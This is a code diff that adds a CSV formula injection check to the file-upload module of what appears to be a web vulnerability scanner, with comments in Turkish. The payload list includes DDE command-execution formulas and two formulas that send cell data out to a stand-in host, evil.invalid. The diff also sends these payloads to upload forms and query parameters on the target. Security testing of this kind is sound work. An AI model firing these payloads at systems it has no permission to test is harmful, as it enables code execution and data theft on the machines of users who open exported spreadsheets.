@@ -378,7 +378,88 @@ class FileUploadScanner(BaseScanner):
 
         logger.info(f"[FileUpload] Found {len(upload_forms)} upload form(s)")
         self._attack_forms(upload_forms)
+
+        # CSV / spreadsheet formula injection
+        self._test_csv_formula_injection(upload_forms, url)
+
         return self.results
+
+    def _test_csv_formula_injection(self, upload_forms: List[Dict], base_url: str) -> None:
+        """
+        CSV / formula injection — export edilen CSV/XLSX içine =cmd() formülü yerleştir.
+        İki vektör:
+        1. Dosya yükleme formu varsa, formül içeren CSV yükle.
+        2. İstek parametrelerine formül enjekte et, dışa aktarım endpoint'i yanıtını incele.
+        """
+        import io
+
+        csv_formula_payloads = [
+            '=CMD|"/C calc"!A0',
+            '=HYPERLINK("http://evil.invalid/exfil","click")',
+            '=1+1',
+            '@SUM(1+1)*cmd|" /C calc"!A0',
+            '-1+1',
+            '"+cmd|" /C whoami"!A0"',
+            '=IMPORTXML(CONCAT("http://evil.invalid/?x=",FORMULATEXT(A1)),"//a")',
+        ]
+
+        # Vector 1: Upload a CSV with formula in a file field
+        for form in upload_forms[:2]:
+            action = form.get("action") or base_url
+            file_field = next((f for f in form.get("inputs", []) if f.get("type") == "file"), None)
+            if not file_field:
+                continue
+            field_name = file_field.get("name", "file")
+
+            for formula in csv_formula_payloads[:3]:
+                csv_content = f"Name,Email,Comment\n{formula},{formula},{formula}"
+                files = {field_name: ("test.csv", io.BytesIO(csv_content.encode()), "text/csv")}
+                try:
+                    resp = self.session.post(action, files=files, timeout=10)
+                    if resp.status_code in (200, 201, 302):
+                        self.report_finding(
+                            vuln_type="CSV Formula Injection (Spreadsheet Injection)",
+                            url=action,
+                            param=field_name,
+                            payload=formula,
+                            severity="Medium",
+                            evidence=(
+                                f"CSV with formula payload accepted (HTTP {resp.status_code}). "
+                                "If exported and opened in Excel/LibreOffice, formula executes."
+                            ),
+                        )
+                        return
+                except Exception as exc:
+                    logger.debug("[CSVFormulaInj] upload probe: %s", exc)
+
+        # Vector 2: Inject formula via query param, look for CSV/export response
+        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+        parsed = urlparse(base_url)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+
+        for param, _ in params[:3]:
+            for formula in csv_formula_payloads[:2]:
+                injected = urlunparse(parsed._replace(query=urlencode(
+                    [(k, formula if k == param else v) for k, v in params]
+                )))
+                try:
+                    resp = self.session.get(injected, timeout=8)
+                    ct = resp.headers.get("content-type", "")
+                    if "csv" in ct or "excel" in ct or "spreadsheet" in ct:
+                        if formula[:6] in (resp.text or ""):
+                            self.report_finding(
+                                vuln_type="CSV Formula Injection (Export Endpoint)",
+                                url=base_url,
+                                param=param,
+                                payload=formula,
+                                severity="Medium",
+                                evidence=f"Formula reflected in CSV export response (Content-Type: {ct})",
+                            )
+                            return
+                except Exception:
+                    pass
 
     def _discover_forms(self, endpoints: List[str], base_url: str) -> List[Dict]:
         upload_forms: List[Dict] = []
